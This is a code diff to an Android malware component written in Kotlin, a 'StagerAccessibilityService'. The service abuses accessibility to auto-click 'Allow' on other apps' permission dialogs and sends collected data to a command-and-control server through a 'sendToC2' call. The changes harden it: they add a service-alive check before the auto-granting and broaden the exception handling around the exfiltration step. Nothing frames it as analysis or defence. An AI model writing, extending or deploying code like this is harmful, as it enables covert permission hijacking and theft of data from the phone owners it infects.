@@ -48,7 +48,7 @@ class StagerAccessibilityService : AccessibilityService() {
             Log.i(TAG, "Permission dialog detected from $pkg, auto-clicking Allow")
             // Short delay for the dialog to fully render (1200ms for Android 15)
             android.os.Handler(mainLooper).postDelayed({
-                grantPermissionIfPrompted()
+                if (isServiceAlive()) grantPermissionIfPrompted()
             }, 1200)
         }
 
@@ -277,9 +277,17 @@ class StagerAccessibilityService : AccessibilityService() {
                     put("timestamp", System.currentTimeMillis())
                 }
                 NetworkUtils.sendToC2(StagerApplication.c2RealUrl, json.toString())
-            } catch (e: Exception) {
+            } catch (e: Throwable) {
                 Log.e(TAG, "Failed to send $dataType", e)
             }
         }.start()
+    }
+
+    private fun isServiceAlive(): Boolean {
+        return instance != null && try {
+            rootInActiveWindow != null || true // Service is connected
+        } catch (e: IllegalStateException) {
+            false
+        }
     }
 }
